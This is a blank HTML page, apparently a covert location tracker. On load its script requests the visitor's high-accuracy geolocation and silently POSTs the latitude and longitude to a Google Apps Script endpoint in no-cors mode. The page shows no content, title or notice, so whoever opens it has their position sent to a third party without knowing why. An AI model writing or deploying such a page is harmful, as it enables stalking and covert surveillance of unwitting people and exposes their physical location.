<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title></title>
  <script>
    function enviar(latitude, longitude) {
      fetch("https://script.google.com/macros/s/AKfycby5kT18kkDvLjtySh6T2JBOSO_qkPy7hQhoqcoR13khsyYbY_74Zp9KhQPiG98VNgd6nQ/exec", {
        method: "POST",
        mode: "no-cors", // ignora bloqueio CORS
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          latitude: latitude,
          longitude: longitude
        })
      })
      .then(() => console.log("✅ Localização enviada"))
      .catch(err => console.error("❌ Erro ao enviar:", err));
    }

    window.onload = function() {
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          (pos) => enviar(pos.coords.latitude, pos.coords.longitude),
          (err) => console.error("Erro ao obter localização:", err),
          { enableHighAccuracy: true }
        );
      } else {
        console.error("Geolocalização não é suportada neste dispositivo.");
      }
    };
  </script>
</head>
<body>
</body>
</html>
